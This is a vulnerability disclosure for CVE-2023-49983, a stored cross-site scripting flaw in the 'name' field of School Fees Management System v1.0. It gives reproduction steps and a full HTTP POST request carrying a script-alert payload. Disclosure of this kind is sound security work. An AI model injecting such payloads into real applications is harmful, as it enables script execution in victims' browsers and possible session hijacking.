# CVE-2023-49983
# School Fees Management System v1.0 - Cross-Site Scripting (XSS) Vulnerability in "name" field/parameter on "/management/class"

**Description**: A cross-site scripting (XSS) vulnerability in the component "/management/class" of School Fees Management System v1.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the name parameter.  

**Vulnerable Product Version**: School Fees Management System v1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49983  
**Tested on**: Windows  
### Steps to reproduce:  
To exploit the vulnerability, a user with appropriate permissions must access the "/ci_fms/admin/management/class" page. On this page, the user should either edit an existing class or add a new one. The malicious payload needs to be inserted into the "name" parameter during this process.
### Request:  
```
POST /ci_fms/admin/action/edit_student/1/1 HTTP/1.1
Host: 192.168.68.148
Content-Length: 268
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.68.148
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydFBWs52W42v8XLGe
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.68.148/ci_fms/admin/enrollment/class/1
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ci_session=c561k45qbrtsb34f2k30f936v0aijl01
Connection: close

------WebKitFormBoundarydFBWs52W42v8XLGe
Content-Disposition: form-data; name="name"

<script>alert(document.domain)</script>
------WebKitFormBoundarydFBWs52W42v8XLGe
Content-Disposition: form-data; name="parent"

1
------WebKitFormBoundarydFBWs52W42v8XLGe--
```     

Discoverer(s)/Credits:  
Geraldo Alcântara
